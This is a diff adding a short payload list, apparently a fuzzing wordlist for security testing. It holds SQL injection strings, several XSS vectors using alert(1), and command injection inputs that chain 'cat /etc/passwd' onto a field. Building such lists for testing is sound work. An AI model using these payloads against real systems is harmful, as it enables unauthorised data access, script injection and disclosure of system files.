@@ -1,0 +1,16 @@
+# SQL
+' OR 1=1--
+'||'1'='1
+'/**/OR/**/1=1--
+1'/**/ORDER/**/BY/**/1--
+# XSS
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+# Command injection
+; cat /etc/passwd
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
